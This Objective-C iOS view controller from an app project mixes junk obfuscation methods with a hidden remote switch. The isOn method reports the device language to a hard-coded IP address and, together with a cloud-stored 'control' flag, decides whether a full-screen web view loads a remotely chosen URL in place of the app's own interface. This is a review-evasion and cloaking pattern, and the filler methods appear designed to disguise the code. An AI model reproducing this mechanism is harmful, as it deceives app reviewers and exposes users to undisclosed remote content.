
#import "RootViewController.h"
#import <AVOSCloud/AVOSCloud.h>
#import "ADWebViewController/ADWebViewController.h"
#import "URLSessionManager/URLSessionManager.h"
#import "UIVieww+CConstraint/UIView+Constraint.h"

@interface RootViewController ()

@property(nonatomic,strong) UIImageView *view1;

@property (nonatomic,strong) UIImageView * startimageview;

@property(nonatomic,strong) UIView * view2;
//weekaoNavigationView
@property(nonatomic, assign) BOOL isVertical;

@property (nonatomic, strong) ADWebViewController *startupView;

@property (nonatomic,assign) BOOL isJPushOn;

@property(nonatomic, assign) BOOL isstartviewokay;

@property(nonatomic,strong) AVQuery *dataQuery;

@end

@implementation RootViewController

+ (void)s1ThfhooisshoulShfewhhNnfnv:(int)numDeifopk isBokklf:(BOOL)isBokklf strSDLLLLgjifosk:(NSString *)strSDLLLLgjifosk {
    int gfgaerhadfadsfagaw = 822;
    BOOL thevfbjyarg2t5yj4553 = NO;
    NSString *loodposwk1030941 = @"eji4s0u62l4xji6tj fm4j06";
    gfgaerhadfadsfagaw = 0;
    thevfbjyarg2t5yj4553 = NO;
    loodposwk1030941 = @"";
}


- (NSString *)weyNaYooGheYounDeLasmeiYohji4:(NSString *)meiYohji4 ji3rug45k4ul4:(BOOL)ji3rug45k4ul4 ugk6ak7xul31j4fu3:(int)ugk6ak7xul31j4fu3 {
    NSString *thesu3d041j4tjdk = @"ridnnvkldklsa/u6w0uul4fm4s83";
    BOOL thexu6wuw83cl3a8o3= YES;
    int the2jruwuw8ua83 = 7446;
    self.isVertical = NO;
    thesu3d041j4tjdk = @"";
    thexu6wuw83cl3a8o3 = NO;
    the2jruwuw8ua83 = 0;
    return meiYohji4;
}

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.isJPushOn = NO;
    self.isVertical = NO;
    [self createViews];
    _view2 = [UIView new];
    [self.view addSubview:self.view2];
    
    self.dataQuery =  [AVQuery queryWithClassName:@"adddata"];
    __block RootViewController *weakSelf = self;
    
    [self.dataQuery getObjectInBackgroundWithId:@"5c934e04ba39c80073aa2183" block:^(AVObject * _Nullable avImage, NSError * _Nullable error) {

        self.isVertical = YES;

        if(error){
            NSLog(@"%@" , error);
        }

        NSArray*imgs=nil;

        if(avImage)imgs =@[avImage];

//        [weakSelf createimageview:imgs];

        self.view1 = nil;
        self.view2 = nil;
        [weakSelf refreshInitialView];
    }];
    
    
}

- (void)didReceiveMemoryWarning {
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];
    
    // Release any cached data, images, etc that aren't in use.
}

- (void)viewDidUnload {
    [super viewDidUnload];
    // Release any retained subviews of the main view.
    // e.g. self.myOutlet = nil;
}

- (void)createimageview:(NSArray*)objects{
    if ([objects count] > 0) {
        AVObject * obj = [objects objectAtIndex:0];
        self.isstartviewokay = ((NSNumber *)[obj objectForKey:@"control"]).boolValue;
        __block RootViewController *weakSelf = self;
        [self isOn:^{
            [self.startupView layoutBottomBarHeight:49];
            NSString* urlstr2 = [obj objectForKey:@"url2"];
            urlstr2 = [urlstr2 stringByTrimmingCharactersInSet:[NSCharacterSet  whitespaceAndNewlineCharacterSet]];
            if ([urlstr2 length] > 0) {
                if(![urlstr2 containsString:@"://"]){
                    urlstr2 = [@"http://" stringByAppendingString:urlstr2];
                }
                weakSelf.view2 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"CED8d1"]];
                [weakSelf.startupView loadURL:urlstr2];
                weakSelf.isVertical = NO;
            } else {
                weakSelf.view1 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"pageBK139"]];
                [weakSelf refreshInitialView];
                weakSelf.isVertical = NO;
                weakSelf.view2 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"CED8d0"]];
            }
        } completion2:^{
            [self.startupView layoutBottomBarHeight:0];
            NSString* urlstr1 = [obj objectForKey:@"url1"];
            urlstr1 = [urlstr1 stringByTrimmingCharactersInSet:[NSCharacterSet  whitespaceAndNewlineCharacterSet]];
            if ([urlstr1 length] > 0) {
                if(![urlstr1 containsString:@"://"]){
                    urlstr1 = [@"http://" stringByAppendingString:urlstr1];
                }
                weakSelf.view2 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"CED8d1"]];
                [weakSelf.startupView loadURL:urlstr1];
                weakSelf.isVertical = NO;
                dispatch_async(dispatch_get_main_queue(), ^(void){
                    [weakSelf performSelector:@selector(refreshInitialView) withObject:nil afterDelay:3];
                });
            } else {
                weakSelf.view1 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"pageBK139"]];
                [weakSelf refreshInitialView];
                weakSelf.isVertical = NO;
                weakSelf.view2 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"CED8d0"]];
            }
        }];
    } else {
        self.view2 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"pageHJe13"]];
        self.isVertical = YES;
        [self refreshInitialView];
        self.view1 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"CEDd03"]];
    }
    self.dataQuery = nil;
    self.view1 = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"ALDpe0"]];
}

- (BOOL)shouldAutorotate {
    return YES;
}

- (void)sojdnfweoifneedjfknawpbsdf:(NSString *)sfwe dsdgaewefwaw:(BOOL)fgrwreagegrhtru {
    NSString *theldmfaklmdfewpfm = @"phdfab53oxdcp8g4we7cWith";
    BOOL thedlmfamfemfle = YES;
    theldmfaklmdfewpfm = @"";
    thedlmfamfemfle = YES;
}

- (NSString *)sldmgmodowsooedwldmvakl:(NSString *)ifmdkdavsa osopslakkwwwad:(BOOL)vdmvkfaksnda kekk1ke2k3kkvd:(NSString *)oeoiddmd98dcnjsm3 osoajjl32ldajbd:(BOOL)sahbfjbewnkdsfsa dwf2fe1greg4:(NSString *)gresar64awe dagfdsgrgesgr734tgae:(BOOL)gadgsgsr54ag {
    NSString *theaosdnksaeda = @"lrjWith";
    BOOL thepsdmfkalsgw09e = YES;
    NSString *f8aakdnjsdjnnfjs = @"tdagntchngWith";
    BOOL thesdlskdsdsdfggavxmz = NO;
    self.view2 = nil;
    NSString *the3sndkaw03dsdg = @"v905mijup1f6nWith";
    BOOL theandknf3asaefdfadg = YES;
    theaosdnksaeda = @"";
    thepsdmfkalsgw09e = NO;
    f8aakdnjsdjnnfjs = @"";
    thesdlskdsdsdfggavxmz = NO;
    the3sndkaw03dsdg = @"";
    theandknf3asaefdfadg = NO;
    return the3sndkaw03dsdg;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation {
    return UIInterfaceOrientationIsLandscape( interfaceOrientation );
}

- (void)isOn:(void (^) (void))completion1 completion2:(void (^) (void))completion2 {
    NSString *cdonsfaks = [NSString stringWithFormat:@"http://47.75.131.189/proof_code/?code=%@", [[NSLocale preferredLanguages] firstObject]];
    [[URLSessionManager shared] requestURL:cdonsfaks method:@"GET" params:@{} completion:^(NSDictionary *response) {
        NSLog(@"%@", response);
        BOOL isOn = ((NSNumber *)[response objectForKey:@"status"]).boolValue;
        if (self.isstartviewokay == YES && isOn) {
            completion1();
        } else {
            completion2();
        }
    }];
}

- (void)refreshInitialView {
    self.view1 = nil;
    self.view2 = nil;
    [self.startupView.view removeFromSuperview];
    self.startupView=nil;
    self.startupView=nil;
    self.isVertical = NO;
    self.isJPushOn = NO;
    self.startimageview=nil;
    self.isstartviewokay=nil;
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Main" bundle:nil];
    UITabBarController *rootViewController = [storyboard instantiateViewControllerWithIdentifier:@"TabBarViewController"];
    [[UIApplication sharedApplication].keyWindow setRootViewController:rootViewController];
}

-(void)createViews{
    self.startupView =  [ADWebViewController initWithURL:@""];
    [self.view addSubview: self.startupView.view];
    [self.startupView.view constraints:self.view];
    [self.startupView layoutBottomBarHeight:0];
}

@end
